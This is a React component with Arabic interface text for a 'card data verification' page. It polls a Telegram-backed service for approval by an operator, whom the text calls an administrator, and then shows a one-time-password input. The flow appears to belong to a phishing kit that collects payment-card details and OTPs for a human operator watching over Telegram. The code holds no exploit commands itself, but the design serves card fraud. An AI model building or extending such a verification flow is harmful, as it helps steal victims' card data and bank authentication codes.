import { Clock } from "lucide-react";
import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { checkRequestStatus } from "../services/telegram";
import { useAppState } from "../store/AppStateContext";
import { CONSTANTS } from "../types";
import OTPInputComponent from "./OTPInputComponent";

const VerificationPage = () => {
  const navigate = useNavigate();
  const { status, requestId, setStatus, setOtp, setError, error } =
    useAppState();
  const [isPolling, setIsPolling] = useState(false);
  const [waitTime, setWaitTime] = useState(0);
  const [retryCount, setRetryCount] = useState(0);

  // Countdown timer for UX feedback
  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (status === "verifying" && waitTime < 120) {
      timer = setInterval(() => {
        setWaitTime((prev) => prev + 1);
      }, 1000);
    }
    return () => {
      if (timer) clearInterval(timer);
    };
  }, [status, waitTime]);

  useEffect(() => {
    // Redirect to home if no requestId exists
    if (!requestId) {
      navigate("/");
      return;
    }

    // Only start polling if we're in verifying state and have a requestId
    if (status !== "verifying" || isPolling) return;

    let pollInterval: NodeJS.Timeout;

    const pollStatus = async () => {
      setIsPolling(true);

      try {
        // Initial check
        const result = await checkRequestStatus(requestId);

        if (result.status === "approved") {
          setStatus("approved");
          if (result.otp) setOtp(result.otp);
          setIsPolling(false);
          return;
        } else if (result.status === "rejected") {
          setStatus("rejected");
          navigate("/error");
          setIsPolling(false);
          return;
        }

        // Set up polling interval for subsequent checks
        pollInterval = setInterval(async () => {
          try {
            const result = await checkRequestStatus(requestId);

            if (result.status === "approved") {
              clearInterval(pollInterval);
              setStatus("approved");
              if (result.otp) setOtp(result.otp);
            } else if (result.status === "rejected") {
              clearInterval(pollInterval);
              setStatus("rejected");
              navigate("/error");
            }
          } catch (err) {
            console.error("Error in polling interval:", err);
            if (retryCount > CONSTANTS.VERIFICATION.MAX_RETRIES) {
              clearInterval(pollInterval);
              setError("حدث خطأ أثناء التحقق. يرجى المحاولة مرة أخرى.");
              setStatus("idle");
              navigate("/");
            } else {
              setRetryCount((prev) => prev + 1);
            }
          }
        }, CONSTANTS.VERIFICATION.POLL_INTERVAL_MS);
      } catch (err) {
        console.error("Error in initial status check:", err);
        setError("حدث خطأ أثناء التحقق. يرجى المحاولة مرة أخرى.");
        setStatus("idle");
        navigate("/");
      } finally {
        setIsPolling(false);
      }
    };

    pollStatus();

    // Cleanup interval on component unmount
    return () => {
      if (pollInterval) clearInterval(pollInterval);
    };
  }, [status, requestId, isPolling, setStatus, setOtp, setError, navigate]);

  // Render appropriate UI based on current status
  return (
    <div className="max-w-md w-full bg-white rounded-lg shadow-md overflow-hidden p-6">
      {status === "verifying" && (
        <div className="flex flex-col items-center justify-center py-8 text-center">
          <div className="w-16 h-16 mb-6 relative">
            <div className="absolute top-0 right-0 left-0 bottom-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
          </div>
          <h2 className="text-xl font-semibold text-gray-800 mb-2">
            جاري التحقق من البيانات
          </h2>
          <p className="text-gray-600 mb-2">
            يرجى الإنتظار بينما يتم التحقق من بيانات البطاقة
          </p>

          {waitTime > 0 && (
            <div className="flex items-center justify-center mt-4 text-gray-500">
              <Clock size={16} className="mr-2" />
              <span>وقت الانتظار: {waitTime} ثانية</span>
            </div>
          )}

          {waitTime > 30 && (
            <p className="text-sm text-amber-600 mt-4">
              يرجى الانتظار، قد تستغرق عملية التحقق بعض الوقت.
            </p>
          )}

          {waitTime > 60 && (
            <p className="text-sm text-amber-700 mt-2">
              شكراً لصبرك، المسؤول يقوم بمراجعة طلبك حالياً.
            </p>
          )}
        </div>
      )}

      {status === "approved" && <OTPInputComponent />}

      {error && (
        <div className="bg-red-50 border-l-4 border-red-500 p-4 mt-4">
          <div className="flex">
            <div>
              <p className="text-red-700">{error}</p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default VerificationPage;
